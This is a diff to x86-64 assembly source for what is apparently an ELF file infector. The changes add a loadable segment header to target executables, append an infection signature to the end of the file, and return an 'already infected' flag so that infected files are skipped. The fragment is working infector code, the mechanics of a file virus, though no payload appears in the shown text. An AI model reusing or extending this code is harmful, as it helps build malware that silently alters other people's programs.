@@ -21,9 +21,8 @@ section .data
     newline:          db 10               ; newline character
     msg_valid:        db " is a valid elf64 executable", 10, 0
     msg_invalid:      db " is not a valid elf64 executable", 10, 0
-    msg_add_pt_load:  db "add pt_load", 10, 0
-    msg_infected:     db "infected file", 10, 0
-    msg_not_infected: db "not infected", 10, 0
+    msg_infected:     db "infected ", 0
+    msg_already_infected: db "already infected ", 0
 
 section .text
 global _start
@@ -234,14 +233,43 @@ add_pt_load:
     lea rsi, [rel elf_phdr_buf]
     syscall
 
+    ; Now append the signature at the end of the file
+    ; Seek to the end of file (where p_offset points)
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    mov rsi, [rbp-8]            ; offset = original file size (end of file)
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    ; Write the signature at the end of the file
+    mov eax, SYS_WRITE
+    mov edi, r13d               ; fd
+    lea rsi, [rel signature]    ; signature string
+    mov edx, signature_len      ; signature length
+    syscall
+
+    ; Check if write succeeded
+    test rax, rax
+    js .add_pt_load_close_fail
+
     ; Close the file
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
 
-    ; Print success message
-    lea rdi, [rel msg_add_pt_load]
+    ; Print "infected " + filename + newline
+    lea rdi, [rel msg_infected]
     call print_string
+    mov rdi, r12                ; filename
+    call print_string
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel newline]
+    mov edx, 1
+    syscall
 
     jmp .add_pt_load_done
 
@@ -274,6 +302,7 @@ add_pt_load:
 check_signature:
     push rbp
     mov rbp, rsp
+    sub rsp, 8                  ; allocate space for return value
     push r12                    ; saved file path
     push r13                    ; saved file descriptor
     push r14                    ; saved file size / bytes read
@@ -376,9 +405,19 @@ check_signature:
     mov edi, r13d
     syscall
 
-    ; Print "infected file"
-    lea rdi, [rel msg_infected]
+    ; Print "already infected " + filename + newline
+    lea rdi, [rel msg_already_infected]
     call print_string
+    mov rdi, r12                ; filename
+    call print_string
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel newline]
+    mov edx, 1
+    syscall
+    
+    ; Return 1 (infected) - save to stack
+    mov qword [rbp-8], 1
     jmp .check_sig_done
 
 .check_sig_close_not_infected:
@@ -388,9 +427,8 @@ check_signature:
     syscall
 
 .check_sig_not_infected:
-    ; Print "not infected"
-    lea rdi, [rel msg_not_infected]
-    call print_string
+    ; Return 0 (not infected) - save to stack
+    mov qword [rbp-8], 0
 
 .check_sig_done:
     pop rbx
@@ -398,6 +436,8 @@ check_signature:
     pop r14
     pop r13
     pop r12
+    ; Load return value from stack
+    mov rax, [rbp-8]
     mov rsp, rbp
     pop rbp
     ret
